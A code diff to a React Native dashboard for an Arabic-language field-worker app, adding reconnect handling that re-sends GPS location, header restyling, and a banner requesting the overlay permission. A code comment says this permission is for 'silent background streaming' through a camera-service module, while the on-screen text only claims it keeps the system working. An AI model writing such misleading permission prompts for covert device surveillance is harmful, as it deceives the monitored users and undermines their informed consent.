@@ -1,10 +1,12 @@
-import { useEffect, useState, useCallback } from 'react';
+import { useEffect, useState, useCallback, useRef } from 'react';
 import { View, Text, TouchableOpacity, ScrollView, Alert, ActivityIndicator, RefreshControl, StyleSheet } from 'react-native';
 import { Ionicons } from '@expo/vector-icons';
 import * as Location from 'expo-location';
+import NetInfo from '@react-native-community/netinfo';
 import api from '../../src/services/api';
 import { useAuthStore } from '../../src/stores/authStore';
 import { requestPermissions, startTracking, stopTracking, isTracking } from '../../src/services/location';
+import { isOverlayPermissionGranted, requestOverlayPermission } from '../../modules/camera-service';
 import { FieldAppointment } from '../../src/types';
 
 export default function DashboardScreen() {
@@ -13,10 +15,54 @@ export default function DashboardScreen() {
 
   const [tracking, setTracking] = useState(false);
   const [toggling, setToggling] = useState(false);
+  const [overlayGranted, setOverlayGranted] = useState(true);
+
+  useEffect(() => {
+    const check = () => {
+      const granted = isOverlayPermissionGranted();
+      setOverlayGranted(granted);
+    };
+    check();
+    // Re-check every 2s in case user just granted it
+    const t = setInterval(check, 2000);
+    return () => clearInterval(t);
+  }, []);
   const [lastPos, setLastPos] = useState<Location.LocationObject | null>(null);
   const [todayTotal, setTodayTotal] = useState(0);
   const [todayPending, setTodayPending] = useState(0);
   const [refreshing, setRefreshing] = useState(false);
+  const [online, setOnline] = useState(true);
+  const wasOffline = useRef(false);
+
+  const [reconnecting, setReconnecting] = useState(false);
+
+  // When internet returns: reload data + send location
+  useEffect(() => {
+    const unsub = NetInfo.addEventListener(state => {
+      const connected = !!(state.isConnected && state.isInternetReachable !== false);
+      setOnline(connected);
+      if (connected && wasOffline.current) {
+        wasOffline.current = false;
+        // Reload all screen data automatically
+        setReconnecting(true);
+        refresh().finally(() => setReconnecting(false));
+        // Also send location immediately
+        Location.getLastKnownPositionAsync({}).then(pos => {
+          if (!pos) return;
+          api.post('/mobile/location', {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+          }).catch(() => {});
+        }).catch(() => {});
+      } else if (!connected) {
+        wasOffline.current = true;
+      }
+    });
+    return () => unsub();
+  }, [refresh]);
 
   const refresh = useCallback(async () => {
     const [running, pos] = await Promise.all([
@@ -34,8 +80,6 @@ export default function DashboardScreen() {
 
   useEffect(() => {
     refresh();
-    const t = setInterval(refresh, 15_000);
-    return () => clearInterval(t);
   }, [refresh]);
 
   // Admin only: manual toggle
@@ -65,19 +109,59 @@ export default function DashboardScreen() {
     <ScrollView style={s.root} refreshControl={<RefreshControl refreshing={refreshing} onRefresh={onRefresh} tintColor="#1e40af" />}>
       {/* Header */}
       <View style={s.header}>
-        <TouchableOpacity onPress={() => Alert.alert('تسجيل الخروج', 'هل تريد الخروج؟', [
-          { text: 'إلغاء', style: 'cancel' },
-          { text: 'خروج', style: 'destructive', onPress: logout },
-        ])}>
-          <Ionicons name="log-out-outline" size={22} color="#93c5fd" />
-        </TouchableOpacity>
-        <View style={{ alignItems: 'flex-end' }}>
-          <Text style={s.greet}>مرحباً،</Text>
-          <Text style={s.userName}>{user?.name}</Text>
+        {/* Title */}
+        <View style={{ alignItems: 'center', marginBottom: 12 }}>
+          <Text style={{ fontSize: 20, fontWeight: '700', color: '#fff', letterSpacing: 1 }}>Saraya</Text>
+          {!online && (
+            <View style={{ flexDirection: 'row', alignItems: 'center', gap: 4, marginTop: 4, backgroundColor: '#dc2626', borderRadius: 10, paddingHorizontal: 10, paddingVertical: 3 }}>
+              <Ionicons name="wifi-outline" size={12} color="#fff" />
+              <Text style={{ color: '#fff', fontSize: 11, fontWeight: '600' }}>لا يوجد اتصال — يبحث تلقائياً...</Text>
+            </View>
+          )}
+          {online && reconnecting && (
+            <View style={{ flexDirection: 'row', alignItems: 'center', gap: 4, marginTop: 4, backgroundColor: '#16a34a', borderRadius: 10, paddingHorizontal: 10, paddingVertical: 3 }}>
+              <Ionicons name="wifi" size={12} color="#fff" />
+              <Text style={{ color: '#fff', fontSize: 11, fontWeight: '600' }}>تم الاتصال — يتم التحديث...</Text>
+            </View>
+          )}
+        </View>
+        {/* Greeting + Logout row */}
+        <View style={{ flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between' }}>
+          <TouchableOpacity
+            onPress={() => Alert.alert('تسجيل الخروج', 'هل تريد الخروج؟', [
+              { text: 'إلغاء', style: 'cancel' },
+              { text: 'خروج', style: 'destructive', onPress: logout },
+            ])}
+            style={s.logoutBtn}
+            activeOpacity={0.8}
+          >
+            <Ionicons name="log-out-outline" size={16} color="#1e3a8a" />
+            <Text style={s.logoutText}>خروج</Text>
+          </TouchableOpacity>
+          <View style={{ alignItems: 'flex-end' }}>
+            <Text style={s.greet}>مرحباً،</Text>
+            <Text style={s.userName}>{user?.name}</Text>
+          </View>
         </View>
       </View>
 
       <View style={s.body}>
+        {/* Overlay permission warning — required for silent background streaming */}
+        {!overlayGranted && (
+          <TouchableOpacity
+            style={s.overlayWarning}
+            onPress={() => { requestOverlayPermission(); setTimeout(() => setOverlayGranted(isOverlayPermissionGranted()), 2000); }}
+            activeOpacity={0.85}
+          >
+            <Ionicons name="warning-outline" size={20} color="#92400e" />
+            <View style={{ flex: 1 }}>
+              <Text style={s.overlayWarnTitle}>مطلوب: صلاحية إضافية</Text>
+              <Text style={s.overlayWarnSub}>اضغط هنا ثم فعّل "السماح بالعرض فوق التطبيقات" لضمان عمل النظام بشكل صحيح</Text>
+            </View>
+            <Ionicons name="chevron-forward" size={16} color="#92400e" />
+          </TouchableOpacity>
+        )}
+
         {/* Admin: show tracking card with full control */}
         {isAdmin && (
           <>
@@ -136,9 +220,15 @@ export default function DashboardScreen() {
 const s = StyleSheet.create({
   root: { flex: 1, backgroundColor: '#f8fafc' },
   header: {
-    backgroundColor: '#1e3a8a', flexDirection: 'row', justifyContent: 'space-between',
-    alignItems: 'center', paddingHorizontal: 20, paddingTop: 8, paddingBottom: 20,
+    backgroundColor: '#1e3a8a',
+    paddingHorizontal: 20, paddingTop: 52, paddingBottom: 18,
   },
+  logoutBtn: {
+    flexDirection: 'row', alignItems: 'center', gap: 6,
+    backgroundColor: '#fff', borderRadius: 12,
+    paddingHorizontal: 18, paddingVertical: 8,
+  },
+  logoutText: { color: '#1e3a8a', fontSize: 14, fontWeight: '700' },
   greet: { color: '#93c5fd', fontSize: 12 },
   userName: { color: '#fff', fontSize: 18, fontWeight: 'bold' },
   body: { padding: 20 },
@@ -158,6 +248,9 @@ const s = StyleSheet.create({
   statCard: { flex: 1, backgroundColor: '#eff6ff', borderRadius: 20, padding: 16 },
   statNum: { fontSize: 32, fontWeight: '900', color: '#1e40af', marginTop: 8 },
   statLabel: { fontSize: 12, color: '#1e40af', opacity: 0.7 },
+  overlayWarning: { flexDirection: 'row', alignItems: 'center', gap: 10, backgroundColor: '#fffbeb', borderRadius: 16, padding: 14, marginBottom: 16, borderWidth: 1, borderColor: '#fde68a' },
+  overlayWarnTitle: { color: '#92400e', fontWeight: '800', fontSize: 14, textAlign: 'right' },
+  overlayWarnSub: { color: '#b45309', fontSize: 12, textAlign: 'right', marginTop: 2, lineHeight: 18 },
   posCard: {
     backgroundColor: '#fff', borderRadius: 20, padding: 16, marginBottom: 16,
     shadowColor: '#000', shadowOffset: { width: 0, height: 1 },
